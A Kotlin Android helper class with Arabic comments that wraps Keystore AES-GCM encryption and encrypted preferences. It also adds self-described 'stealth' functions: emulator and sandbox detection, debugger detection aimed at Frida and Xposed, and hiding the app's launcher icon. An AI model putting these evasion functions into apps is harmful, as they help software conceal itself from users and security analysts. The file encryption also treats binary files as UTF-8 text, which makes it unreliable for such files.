package com.example.app

import android.content.ComponentName
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Debug
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.util.Base64
import android.util.Log
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.nio.charset.StandardCharsets
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec

/**
 * فئة مساعدة لتشفير وفك تشفير البيانات الحساسة باستخدام Android Keystore.
 * 
 * الميزات الأساسية:
 * - تشفير/فك تشفير النصوص (AES-GCM مع Android Keystore)
 * - تشفير/فك تشفير الملفات (لحماية البيانات المخزنة محلياً)
 * - SharedPreferences مشفرة (لتخزين التوكنات والإعدادات بشكل آمن)
 * - إدارة المفتاح مع التخزين المؤقت لتقليل استدعاءات Keystore
 * - دعم التوافق مع Android 6+ (API 23+)
 * 
 * ميزات التخفي والأمان المتقدمة:
 * - كشف بيئات التحليل والمحاكيات (Anti-Emulator)
 * - كشف وجود مصحح أخطاء متصل (Anti-Debugging)
 * - إخفاء وإظهار أيقونة التطبيق من درج التطبيقات
 * 
 * @see <a href="https://developer.android.com/training/articles/keystore">Android Keystore</a>
 */
object SecurityHelper {

    private const val TAG = "SecurityHelper"

    // ==================== الثوابت ====================
    private const val KEY_PROVIDER = "AndroidKeyStore"
    private const val KEY_ALIAS = "ShieldCoreMasterKey"
    private const val TRANSFORMATION = "AES/GCM/NoPadding"
    private const val GCM_TAG_LENGTH = 128
    private const val IV_SEPARATOR = "]"
    private const val AES_KEY_SIZE = 256

    // ==================== الذاكرة المؤقتة للمفتاح ====================
    @Volatile
    private var cachedSecretKey: SecretKey? = null

    // ==================== إدارة المفتاح الرئيسي ====================

    /**
     * الحصول على المفتاح السري من Keystore أو إنشائه إذا لم يكن موجوداً.
     * يتم تخزين المفتاح في الذاكرة المؤقتة لتجنب استدعاء Keystore في كل عملية.
     *
     * @return SecretKey المستخدم للتشفير وفك التشفير
     * @throws Exception في حالة فشل الوصول إلى Keystore
     */
    @Synchronized
    @Throws(Exception::class)
    private fun getOrCreateSecretKey(): SecretKey {
        // استخدام المفتاح من الذاكرة المؤقتة إن وجد
        cachedSecretKey?.let { return it }

        val keyStore = KeyStore.getInstance(KEY_PROVIDER).apply { load(null) }

        // إذا كان المفتاح موجوداً في Keystore، استرجاعه
        if (keyStore.containsAlias(KEY_ALIAS)) {
            val entry = keyStore.getEntry(KEY_ALIAS, null) as? KeyStore.SecretKeyEntry
                ?: throw IllegalStateException("SecretKey entry not found for alias: $KEY_ALIAS")
            cachedSecretKey = entry.secretKey
            Log.d(TAG, "✅ تم استرجاع المفتاح من Keystore (مخزّن مؤقتاً).")
            return entry.secretKey
        }

        // إنشاء مفتاح جديد
        Log.i(TAG, "🔑 إنشاء مفتاح تشفير جديد في Android Keystore...")
        val keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, KEY_PROVIDER)

        val builder = KeyGenParameterSpec.Builder(
            KEY_ALIAS,
            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
        )
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(AES_KEY_SIZE)
            // تعطيل المصادقة المطلوبة من المستخدم (للتشغيل في الخلفية)
            .setUserAuthenticationRequired(false)
            // السماح باستخدام المفتاح في أي وقت (لا حاجة لمصادقة إضافية)
            .setUserAuthenticationValidityDurationSeconds(-1)

        // في Android 11+ يمكن تعطيل StrongBox (اختياري)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // builder.setIsStrongBoxBacked(false) // اختياري
        }

        keyGenerator.init(builder.build())
        val newKey = keyGenerator.generateKey()
        cachedSecretKey = newKey
        Log.i(TAG, "✅ تم إنشاء مفتاح تشفير جديد وحفظه في Keystore.")
        return newKey
    }

    /**
     * التحقق من وجود المفتاح في Keystore.
     * @return true إذا كان المفتاح موجوداً، false وإلا
     */
    fun isKeyAvailable(): Boolean {
        return try {
            val keyStore = KeyStore.getInstance(KEY_PROVIDER).apply { load(null) }
            keyStore.containsAlias(KEY_ALIAS)
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ فشل التحقق من وجود المفتاح: ${e.message}")
            false
        }
    }

    /**
     * الحصول على تفاصيل حالة المفتاح.
     * @return خريطة تحتوي على حالة المفتاح وتفاصيله
     */
    fun getKeyStatus(): Map<String, Any> {
        return try {
            val exists = isKeyAvailable()
            val keySize = if (exists) AES_KEY_SIZE else 0
            val provider = if (exists) KEY_PROVIDER else "N/A"

            mapOf(
                "available" to exists,
                "key_size" to keySize,
                "provider" to provider,
                "alias" to KEY_ALIAS,
                "algorithm" to "AES/GCM/NoPadding"
            )
        } catch (e: Exception) {
            mapOf(
                "available" to false,
                "error" to (e.message ?: "Unknown error")
            )
        }
    }

    /**
     * مسح المفتاح من الذاكرة المؤقتة (يُستخدم لتقليل استهلاك الذاكرة).
     * يُنصح باستدعائها في `onDestroy()` من `MainActivity`.
     */
    fun clearCachedKey() {
        cachedSecretKey = null
        Log.d(TAG, "🧹 تم مسح المفتاح المؤقت من الذاكرة.")
    }

    // ==================== تشفير/فك تشفير النصوص ====================

    /**
     * تشفير نص مفرد باستخدام AES-GCM مع IV عشوائي.
     * @param plainText النص المراد تشفيره
     * @return النص المشفر مع IV مدمج (Base64) أو null في حالة الفشل
     */
    fun encrypt(plainText: String?): String? {
        if (plainText.isNullOrEmpty()) return null
        return try {
            val secretKey = getOrCreateSecretKey()
            val cipher = Cipher.getInstance(TRANSFORMATION)
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)

            val iv = cipher.iv
            val encryptedBytes = cipher.doFinal(plainText.toByteArray(StandardCharsets.UTF_8))

            // استخدام Base64.NO_WRAP لمنع إضافة فواصل أسطر
            val ivBase64 = Base64.encodeToString(iv, Base64.NO_WRAP)
            val encryptedBase64 = Base64.encodeToString(encryptedBytes, Base64.NO_WRAP)

            "$ivBase64$IV_SEPARATOR$encryptedBase64"
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل تشفير النص: ${e.message}", e)
            null
        }
    }

    /**
     * فك تشفير نص مشفر مسبقاً.
     * @param encryptedData النص المشفر (مع IV مدمج)
     * @return النص الأصلي أو null في حالة الفشل
     */
    fun decrypt(encryptedData: String?): String? {
        if (encryptedData.isNullOrEmpty() || !encryptedData.contains(IV_SEPARATOR)) {
            return null
        }
        return try {
            val parts = encryptedData.split(IV_SEPARATOR)
            if (parts.size != 2) return null

            val iv = Base64.decode(parts[0], Base64.NO_WRAP)
            val encryptedBytes = Base64.decode(parts[1], Base64.NO_WRAP)

            val secretKey = getOrCreateSecretKey()
            val cipher = Cipher.getInstance(TRANSFORMATION)
            val spec = GCMParameterSpec(GCM_TAG_LENGTH, iv)
            cipher.init(Cipher.DECRYPT_MODE, secretKey, spec)

            val decryptedBytes = cipher.doFinal(encryptedBytes)
            String(decryptedBytes, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل فك تشفير النص: ${e.message}", e)
            null
        }
    }

    /**
     * تشفير قائمة من النصوص دفعة واحدة.
     * @param plainList القائمة المطلوب تشفيرها
     * @return قائمة جديدة تحتوي على النصوص المشفرة (يتم تخطي العناصر الفاشلة)
     */
    fun encryptList(plainList: List<String>): List<String> {
        return plainList.mapNotNull { encrypt(it) }
    }

    /**
     * فك تشفير قائمة من النصوص المشفرة.
     * @param encryptedList القائمة المشفرة
     * @return قائمة جديدة تحتوي على النصوص الأصلية (يتم تخطي العناصر التالفة)
     */
    fun decryptList(encryptedList: List<String>): List<String> {
        return encryptedList.mapNotNull { decrypt(it) }
    }

    // ==================== تشفير/فك تشفير الملفات ====================

    /**
     * تشفير ملف وحفظه كملف مشفر جديد.
     * @param sourceFile الملف الأصلي المراد تشفيره
     * @param destFile الملف الهدف (سيتم إنشاؤه)
     * @return true إذا تم التشفير بنجاح، false وإلا
     */
    fun encryptFile(sourceFile: File, destFile: File): Boolean {
        if (!sourceFile.exists() || !sourceFile.isFile) {
            Log.e(TAG, "❌ Source file not found: ${sourceFile.absolutePath}")
            return false
        }

        return try {
            val content = sourceFile.readBytes()
            val encrypted = encrypt(String(content, StandardCharsets.UTF_8))
            if (encrypted == null) return false

            destFile.parentFile?.mkdirs()
            destFile.writeText(encrypted, StandardCharsets.UTF_8)
            Log.d(TAG, "✅ File encrypted: ${destFile.absolutePath}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ File encryption error: ${e.message}", e)
            false
        }
    }

    /**
     * فك تشفير ملف مشفر واسترجاع المحتوى الأصلي.
     * @param encryptedFile الملف المشفر
     * @param destFile الملف الهدف لفك التشفير
     * @return true إذا تم فك التشفير بنجاح، false وإلا
     */
    fun decryptFile(encryptedFile: File, destFile: File): Boolean {
        if (!encryptedFile.exists() || !encryptedFile.isFile) {
            Log.e(TAG, "❌ Encrypted file not found: ${encryptedFile.absolutePath}")
            return false
        }

        return try {
            val encryptedContent = encryptedFile.readText(StandardCharsets.UTF_8)
            val decrypted = decrypt(encryptedContent)
            if (decrypted == null) return false

            destFile.parentFile?.mkdirs()
            destFile.writeText(decrypted, StandardCharsets.UTF_8)
            Log.d(TAG, "✅ File decrypted: ${destFile.absolutePath}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ File decryption error: ${e.message}", e)
            false
        }
    }

    // ==================== SharedPreferences مشفرة ====================

    /**
     * إنشاء كائن SharedPreferences مشفر باستخدام Android Keystore.
     * يستخدم `EncryptedSharedPreferences` من مكتبة `androidx.security`.
     * 
     * @param context سياق التطبيق
     * @param name اسم ملف الـ SharedPreferences
     * @return SharedPreferences مشفرة، أو null في حالة الفشل
     */
    fun getEncryptedPreferences(context: Context, name: String = "secure_prefs"): SharedPreferences? {
        return try {
            // إنشاء MasterKey باستخدام الـ Keystore
            val masterKey = MasterKey.Builder(context)
                .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                .build()

            // إنشاء SharedPreferences مشفرة
            EncryptedSharedPreferences.create(
                context,
                name,
                masterKey,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل إنشاء SharedPreferences مشفرة: ${e.message}", e)
            null
        }
    }

    /**
     * حفظ قيمة سلسلة نصية في SharedPreferences مشفرة.
     * @param context سياق التطبيق
     * @param key المفتاح
     * @param value القيمة
     * @param prefsName اسم ملف الـ SharedPreferences (اختياري)
     * @return true إذا تم الحفظ بنجاح، false وإلا
     */
    fun saveEncryptedString(
        context: Context,
        key: String,
        value: String,
        prefsName: String = "secure_prefs"
    ): Boolean {
        val prefs = getEncryptedPreferences(context, prefsName) ?: return false
        return try {
            prefs.edit().putString(key, value).apply()
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل حفظ القيمة المشفرة: ${e.message}", e)
            false
        }
    }

    /**
     * استرجاع قيمة سلسلة نصية من SharedPreferences مشفرة.
     * @param context سياق التطبيق
     * @param key المفتاح
     * @param defaultValue القيمة الافتراضية في حالة عدم وجود المفتاح
     * @param prefsName اسم ملف الـ SharedPreferences (اختياري)
     * @return القيمة المخزنة أو defaultValue
     */
    fun getEncryptedString(
        context: Context,
        key: String,
        defaultValue: String = "",
        prefsName: String = "secure_prefs"
    ): String {
        val prefs = getEncryptedPreferences(context, prefsName) ?: return defaultValue
        return try {
            prefs.getString(key, defaultValue) ?: defaultValue
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل استرجاع القيمة المشفرة: ${e.message}", e)
            defaultValue
        }
    }

    // ==================== إدارة المفتاح (حذف / إعادة تعيين) ====================

    /**
     * حذف المفتاح الرئيسي من Keystore.
     * يُستخدم عند إعادة ضبط التطبيق أو تغيير التوكنات.
     */
    fun clearMasterKey() {
        try {
            val keyStore = KeyStore.getInstance(KEY_PROVIDER).apply { load(null) }
            if (keyStore.containsAlias(KEY_ALIAS)) {
                keyStore.deleteEntry(KEY_ALIAS)
                cachedSecretKey = null
                Log.i(TAG, "🧹 تم حذف المفتاح الرئيسي من Keystore.")
            } else {
                Log.d(TAG, "ℹ️ المفتاح الرئيسي غير موجود في Keystore.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ فشل حذف المفتاح: ${e.message}", e)
        }
    }

    /**
     * إعادة تعيين المفتاح (حذف القديم وإنشاء جديد).
     * @return true إذا تمت إعادة التعيين بنجاح، false وإلا
     */
    fun resetKey(): Boolean {
        return try {
            clearMasterKey()
            getOrCreateSecretKey()
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل إعادة تعيين المفتاح: ${e.message}", e)
            false
        }
    }

    /**
     * التحقق من صحة المفتاح (محاولة تشفير وفك تشفير نص اختبار).
     * @return true إذا كان المفتاح يعمل بشكل صحيح، false وإلا
     */
    fun verifyKey(): Boolean {
        return try {
            val testText = "ShieldCore_KeyTest_${System.currentTimeMillis()}"
            val encrypted = encrypt(testText) ?: return false
            val decrypted = decrypt(encrypted)
            decrypted == testText
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل التحقق من المفتاح: ${e.message}", e)
            false
        }
    }

    // ============================================================
    //  ✅ دوال التخفي والكشف المتقدمة (Anti-Debugging & Anti-Emulator)
    // ============================================================

    /**
     * التحقق مما إذا كان التطبيق يعمل في بيئة محاكاة أو صندوق تحليل (Sandbox).
     * يستخدم عدة معايير للكشف:
     * - خصائص النظام (Fingerprint, Model, Device)
     * - عدد أنوية المعالج (أقل من 4 يشير إلى محاكاة)
     * - وجود متجر Google Play (غيابه يشير إلى بيئة محاكاة)
     * 
     * @param context سياق التطبيق
     * @return true إذا تم الكشف عن بيئة محاكاة، false إذا كانت البيئة حقيقية
     */
    fun isRunningInSandbox(context: Context): Boolean {
        try {
            // كشف المحاكيات بناءً على خصائص النظام
            val fingerprint = Build.FINGERPRINT.lowercase()
            val model = Build.MODEL.lowercase()
            val device = Build.DEVICE.lowercase()
            
            val suspiciousPatterns = listOf(
                "generic", "sdk", "emulator", "vbox", "nox",
                "bluestacks", "genymotion", "x86", "google_sdk",
                "ranchu", "goldfish" // أنوية المحاكيات الشائعة
            )
            
            if (suspiciousPatterns.any { 
                fingerprint.contains(it) || model.contains(it) || device.contains(it) 
            }) {
                Log.w(TAG, "⚠️ بيئة محاكاة مشبوهة: fingerprint=$fingerprint, model=$model, device=$device")
                return true
            }

            // المحاكيات عادة تملك عدد أنوية قليل (أقل من 4)
            val cores = Runtime.getRuntime().availableProcessors()
            if (cores < 4) {
                Log.w(TAG, "⚠️ عدد أنوية المعالج منخفض: $cores")
                return true
            }

            // التحقق من وجود متجر Google Play (غير موجود في معظم المحاكيات)
            try {
                context.packageManager.getPackageInfo("com.android.vending", 0)
            } catch (_: Exception) {
                Log.w(TAG, "⚠️ متجر Google Play غير موجود (بيئة محاكاة محتملة)")
                return true
            }

            return false
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل كشف بيئة المحاكاة: ${e.message}")
            return false // في حالة الخطأ، نفترض أنها بيئة حقيقية
        }
    }

    /**
     * التحقق من وجود مصحح أخطاء متصل (Debugger).
     * يستخدم للكشف عن أدوات مثل Frida و Xposed ومصححات Android Studio.
     * 
     * @return true إذا تم الكشف عن وجود مصحح، false إذا لم يكن هناك مصحح
     */
    fun isDebuggerAttached(): Boolean {
        return try {
            val debuggerConnected = Debug.isDebuggerConnected() || Debug.waitingForDebugger()
            if (debuggerConnected) {
                Log.w(TAG, "⚠️ تم الكشف عن وجود مصحح أخطاء متصل!")
            }
            debuggerConnected
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل كشف المصحح: ${e.message}")
            false
        }
    }

    /**
     * إخفاء أيقونة التطبيق من درج التطبيقات (Launcher).
     * يستخدم ActivityAlias الموجود في AndroidManifest.xml.
     * 
     * @param context سياق التطبيق
     */
    fun hideAppIcon(context: Context) {
        try {
            val componentName = ComponentName(
                context,
                "${context.packageName}.MainActivityAlias"
            )
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "✅ تم إخفاء أيقونة التطبيق من درج التطبيقات.")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ فشل إخفاء الأيقونة: ${e.message}")
        }
    }

    /**
     * إظهار أيقونة التطبيق في درج التطبيقات (في حال الحاجة).
     * 
     * @param context سياق التطبيق
     */
    fun showAppIcon(context: Context) {
        try {
            val componentName = ComponentName(
                context,
                "${context.packageName}.MainActivityAlias"
            )
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "✅ تم إظهار أيقونة التطبيق في درج التطبيقات.")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ فشل إظهار الأيقونة: ${e.message}")
        }
    }

    /**
     * التحقق الشامل من بيئة التشغيل (تجمع بين جميع اختبارات الكشف).
     * 
     * @param context سياق التطبيق
     * @return خريطة تحتوي على نتائج جميع الاختبارات
     */
    fun getEnvironmentStatus(context: Context): Map<String, Any> {
        val sandbox = isRunningInSandbox(context)
        val debugger = isDebuggerAttached()
        return mapOf(
            "is_sandbox" to sandbox,
            "is_debugger_attached" to debugger,
            "is_secure_environment" to (!sandbox && !debugger),
            "fingerprint" to Build.FINGERPRINT,
            "model" to Build.MODEL,
            "device" to Build.DEVICE,
            "processor_cores" to Runtime.getRuntime().availableProcessors()
        )
    }

    // ==================== أدوات مساعدة ====================

    /**
     * تشفير البيانات ثم حفظها في ملف، مع إرجاع مسار الملف.
     * @param data البيانات المراد تشفيرها
     * @param destFile الملف الهدف
     * @return true إذا تم الحفظ بنجاح، false وإلا
     */
    fun encryptAndSave(data: String, destFile: File): Boolean {
        val encrypted = encrypt(data) ?: return false
        return try {
            destFile.parentFile?.mkdirs()
            destFile.writeText(encrypted, StandardCharsets.UTF_8)
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل حفظ البيانات المشفرة: ${e.message}", e)
            false
        }
    }

    /**
     * قراءة ملف مشفر وفك تشفيره.
     * @param file الملف المشفر
     * @return البيانات الأصلية أو null في حالة الفشل
     */
    fun loadAndDecrypt(file: File): String? {
        if (!file.exists() || !file.isFile) {
            Log.e(TAG, "❌ الملف غير موجود: ${file.absolutePath}")
            return null
        }
        return try {
            val encrypted = file.readText(StandardCharsets.UTF_8)
            decrypt(encrypted)
        } catch (e: Exception) {
            Log.e(TAG, "❌ فشل تحميل وفك تشفير الملف: ${e.message}", e)
            null
        }
    }

    /**
     * الحصول على معلومات حول حالة التشفير.
     * @return خريطة تحتوي على حالة النظام
     */
    fun getStatus(): Map<String, Any> {
        return mapOf(
            "key_available" to isKeyAvailable(),
            "key_alias" to KEY_ALIAS,
            "key_provider" to KEY_PROVIDER,
            "cipher_transformation" to TRANSFORMATION,
            "is_key_verified" to verifyKey()
        )
    }

    /**
     * تنظيف المفتاح المؤقت والموارد عند الخروج من التطبيق.
     * يجب استدعاؤها في `onDestroy()` من `MainActivity`.
     */
    fun cleanup() {
        clearCachedKey()
        Log.d(TAG, "🧹 تم تنظيف موارد SecurityHelper.")
    }
}
